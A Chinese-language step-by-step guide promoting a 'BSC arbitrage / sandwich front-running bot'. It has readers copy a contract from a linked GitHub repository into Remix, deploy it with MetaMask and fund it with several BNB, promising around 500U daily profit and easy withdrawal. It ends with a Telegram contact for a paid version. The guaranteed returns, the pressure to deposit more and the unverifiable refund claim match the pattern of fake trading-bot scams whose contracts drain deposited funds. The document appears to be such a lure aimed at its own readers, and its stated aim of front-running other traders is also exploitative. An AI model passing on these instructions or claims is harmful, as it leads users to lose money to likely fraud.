抢跑机器人,夹子机器人

最新版BSC套利机器人，0撸pancake交易所滑点，0基础部署教程，投入100U（多少随意），日入500U，躺赚

马上拥有一个属于您的套利机器人吧！

部署说明:

第 1 步 - 在谷歌浏览器 中设置 MetaMask小狐狸 钱包 获取MetaMask小狐狸钱包地址： https://metamask.io/

第 2 步 - 将币安智能链网络添加到 MetaMask 将BSC智能链添加到小狐狸钱包：

第 3 步 - 打开Remix部署智能合约网站： https://remix.ethereum.org/

第 4 步 - 复制套利机器人合约代码5.5到remix （2024年11月29日 更新）

第 5 步 - 按照视频教程继续操作

下面是Step by Step的步骤：
# 1. 准备工作

1. 下载安装好一个chrome浏览器

> 如何安装，请参考网上教程，百度搜索会有很多。

2. 在chrome上安装metamask钱包插件。

> 如何安装，也请参考网上教程，百度搜索会有很多。

3. 往metamask钱包转一定的BNB。

> 建议尽可能多些，至于为什么，后面会解释。

> 这里就对这些前期的准备工作，不做更多的解释，有不清楚的同学，请留下联系方式，或观看我们的视频寻求帮助。下面赶紧开始我们的夹子机器人的搭建工作。

# 2. 部署夹子机器人合约

1. 请从以下的仓库，获取到合约代码：https://github.com/doger871/panscake/blob/main/bot.sol
2. 打开remix IDE

![1732863378938](C:\Users\XH\AppData\Roaming\Typora\typora-user-images\1732863378938.png)

3. remix会给出帮助它改善的对话框，我们不用理会

![1732863482233](C:\Users\XH\AppData\Roaming\Typora\typora-user-images\1732863482233.png)

4. 点击`contract`文件夹

![1732863558513](C:\Users\XH\AppData\Roaming\Typora\typora-user-images\1732863558513.png)

5. 点击新建文件图标

![1732863606873](C:\Users\XH\AppData\Roaming\Typora\typora-user-images\1732863606873.png)

6. 编辑文件名为`bot.sol`

![1732863736115](C:\Users\XH\AppData\Roaming\Typora\typora-user-images\1732863736115.png)

> 请注意，文件的后缀名一定为`sol`。

7. 然后将第一步获取的合约代码内容拷贝过来

- 会弹出一个告警对话框，我们点`OK`

![1732863895286](C:\Users\XH\AppData\Roaming\Typora\typora-user-images\1732863895286.png)

> 任何代码粘贴过来，Remix都会给出这个提示，不用理会。

![1732863977865](C:\Users\XH\AppData\Roaming\Typora\typora-user-images\1732863977865.png)

8. 点击左边栏的编译图标，先选择编译器的版本，我们选：0.6.7

![1732864113172](C:\Users\XH\AppData\Roaming\Typora\typora-user-images\1732864113172.png)

9. 点击下图的按钮，进行编译

![1732864173698](C:\Users\XH\AppData\Roaming\Typora\typora-user-images\1732864173698.png)

确保编译通过：

![1732864590755](C:\Users\XH\AppData\Roaming\Typora\typora-user-images\1732864590755.png)

10. 连接钱包

![1732864760647](C:\Users\XH\AppData\Roaming\Typora\typora-user-images\1732864760647.png)

![1732864796566](C:\Users\XH\AppData\Roaming\Typora\typora-user-images\1732864796566.png)

![1732864832313](C:\Users\XH\AppData\Roaming\Typora\typora-user-images\1732864832313.png)

连接上后，会看到下图红框里的network ID与钱包地址：

![1732865159124](C:\Users\XH\AppData\Roaming\Typora\typora-user-images\1732865159124.png)

11. 部署合约

![1732865262008](C:\Users\XH\AppData\Roaming\Typora\typora-user-images\1732865262008.png)

再点击`transact`，就会执行该夹子机器人智能合约的部署

命令发出后，会请求metamask钱包签名：

![1732865413312](C:\Users\XH\AppData\Roaming\Typora\typora-user-images\1732865413312.png)

> 可以看到这个合约的部署会花1U左右的GAS费。

# 3. 启动夹子机器人

1. 部署成功后，可以BSC的区块浏览器，看到它

![1732865730863](C:\Users\XH\AppData\Roaming\Typora\typora-user-images\1732865730863.png)

2. 然后继续使用remix，来启动这个机器人

![1732865980005](C:\Users\XH\AppData\Roaming\Typora\typora-user-images\1732865980005.png)

点击上图中的`action`，就可以启动这个机器人了。

> 是不是很简单？但还没有结束，记得要给这个你自己新部署的夹子机器人，转一定的BNB哦。否则该夹子机器人不会启动，去加GAS或烧区块，去抢买入，也就没法为你创造盈利了。

> 建议用户

# 4. Q&A

> Q1：如何退回存放在合约中的BNB？

在部署合约后转入1bnb，在需要退回资金时，只需再次 双击 action ,小狐狸钱包确认支付一点手续即可取出所有存入的 bnb 返回钱包。

> Q2:  如何继续存入BNB？

存入任何大于1的BNB即可。合约添加了保护机制，为了资金命中率，如果单次少于1BNB ，合约将暂停执行，直到达到所需金额，不过你如果想要退回资金，可以参照上一个问题的描述。

> Q3:  合约运行后没有收益产生怎么办？

主要是你存入的BNB太少。由于现在抢跑竞争激励，太少了机器人由于盈利空间太小，甚至可能产生亏损，因此不会去触发套利。

据大家观察，一般存3~5个BNB，盈利就会比较可观。可以话，能存多存些，这样赢利的基数更大，获利将会更大。

现在还有套利空间，大家抓紧时间上车！

大家有任何疑问，或者需要购买正式版 可以通过电报Telegram联系我：@liuy
